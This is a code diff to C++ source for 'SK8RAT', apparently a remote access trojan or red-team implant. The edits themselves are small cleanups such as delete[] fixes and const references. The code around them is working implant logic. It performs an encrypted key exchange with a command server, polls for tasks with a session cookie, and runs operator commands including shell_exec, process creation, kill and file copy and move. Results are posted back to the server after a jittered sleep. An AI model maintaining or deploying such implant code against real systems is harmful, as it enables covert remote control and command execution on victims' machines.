@@ -484,17 +484,17 @@ void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
 	sessioncookie = ssessioncookie;
 
 	// Clean-up dynamically allocated heap
-	delete(ciphertext);
-	delete(sessionkey);
-	delete(ciphertext2);
-	delete(ciphertext_stage2);
-	delete(ciphertext_stage3);
+	delete[] ciphertext;
+	delete[] sessionkey;
+	delete[] ciphertext2;
+	delete[] ciphertext_stage2;
+	delete[] ciphertext_stage3;
 
 	// Sleep then return
 	SleepJitter(sleep, jitter);
 }
 
-void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
+void SK8RAT_tasking(unsigned char * symmetrickey, const std::string& sessioncookie)
 {
 	std::string encrypted_tasking = "";
 	agent_get_cookie(server_ip, server_port, get_uri, sessioncookie, encrypted_tasking);
@@ -507,8 +507,8 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 	}
 
 	// Parse server response
-	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(":")));
-	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(":") + 1));
+	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(':')));
+	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(':') + 1));
 	const unsigned char* cnonce = (const unsigned char *)nonce.c_str();
 	const unsigned char* cciphertext = (const unsigned char *)ciphertext.c_str();
 
@@ -542,7 +542,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		if (temp.substr(0, 2) == "cd")
 		{
 			// This whole process is checking for paths with spaces
-			std::string arguments = temp.substr(temp.find(" ") + 1);
+			std::string arguments = temp.substr(temp.find(' ') + 1);
 			std::string arguments_parsed = "";
 			for (int i = 0; i < arguments.length(); i++)
 			{
@@ -565,7 +565,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 					arguments_parsed += c;
 				}
 			}
-			std::string path = arguments_parsed.substr(0, arguments_parsed.find("\n"));
+			std::string path = arguments_parsed.substr(0, arguments_parsed.find('\n'));
 			// Perform the cd, update json blob
 			cd(path);
 			j["task_output"][i] = "no output";
@@ -575,7 +575,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		if (temp.substr(0, 2) == "cp")
 		{
 			// This whole process is checking for paths with spaces
-			std::string arguments = temp.substr(temp.find(" ") + 1);
+			std::string arguments = temp.substr(temp.find(' ') + 1);
 			std::string arguments_parsed = "";
 			for (int i = 0; i < arguments.length(); i++)
 			{
@@ -598,8 +598,8 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 					arguments_parsed += c;
 				}
 			}
-			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find("\n"));
-			std::string dest_file = arguments_parsed.substr(arguments_parsed.find("\n") + 1);
+			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find('\n'));
+			std::string dest_file = arguments_parsed.substr(arguments_parsed.find('\n') + 1);
 			// Perform the cp, update json blob
 			cp(src_file, dest_file);
 			j["task_output"][i] = "no output";
@@ -609,7 +609,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		if (temp.substr(0, 2) == "mv")
 		{
 			// This whole process is checking for paths with spaces
-			std::string arguments = temp.substr(temp.find(" ") + 1);
+			std::string arguments = temp.substr(temp.find(' ') + 1);
 			std::string arguments_parsed = "";
 			for (int i = 0; i < arguments.length(); i++)
 			{
@@ -632,8 +632,8 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 					arguments_parsed += c;
 				}
 			}
-			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find("\n"));
-			std::string dest_file = arguments_parsed.substr(arguments_parsed.find("\n") + 1);
+			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find('\n'));
+			std::string dest_file = arguments_parsed.substr(arguments_parsed.find('\n') + 1);
 			// Perform the mv, update json blob
 			mv(src_file, dest_file);
 			j["task_output"][i] = "no output";
@@ -691,7 +691,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			}
 			else
 			{
-				path = temp.substr(temp.find(" ") + 1);
+				path = temp.substr(temp.find(' ') + 1);
 			}
 
 			// Perform ls and stuff into json blob
@@ -701,7 +701,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		}
 		if (temp.substr(0, 10) == "shell_exec")
 		{
-			std::string path = temp.substr(temp.find(" ") + 1);
+			std::string path = temp.substr(temp.find(' ') + 1);
 
 			// Perform shell_exec and stuff into json blob
 			j["task_output"][i] = shell_exec(path);
@@ -714,7 +714,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 			createthread_in *ct_create_process_exec_in = new createthread_in(); //DELETE THIS IN THREAD
 			ct_create_process_exec_in->j = &j;
 			ct_create_process_exec_in->counter = i;
-			ct_create_process_exec_in->input = temp.substr(temp.find(" ") + 1);
+			ct_create_process_exec_in->input = temp.substr(temp.find(' ') + 1);
 
 			// Create thread to perform task and write task output to json at [i]
 			CreateThread(0, 0, create_process_exec_thread, ct_create_process_exec_in, 0, 0);
@@ -723,7 +723,7 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 		if (temp.substr(0, 4) == "kill")
 		{
 			// Save pid as string, convert to int
-			std::string pid_s = temp.substr(temp.find(" ") + 1);
+			std::string pid_s = temp.substr(temp.find(' ') + 1);
 			int pid = std::stoi(pid_s);
 
 			// Perform kill and stuff into json blob
@@ -764,8 +764,8 @@ void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
 	agent_post_cookie(server_ip, server_port, post_uri, sessioncookie, send_response, server_response2);
 
 	// Clean-up dynamically allocated memory
-	delete(server_response);
-	delete(ciphertext_response);
+	delete[] server_response;
+	delete[] ciphertext_response;
 
 	// Sleep then return
 	printf("Sleeping for %i second(s) with %i%% jitter\n\n", sleep, jitter);
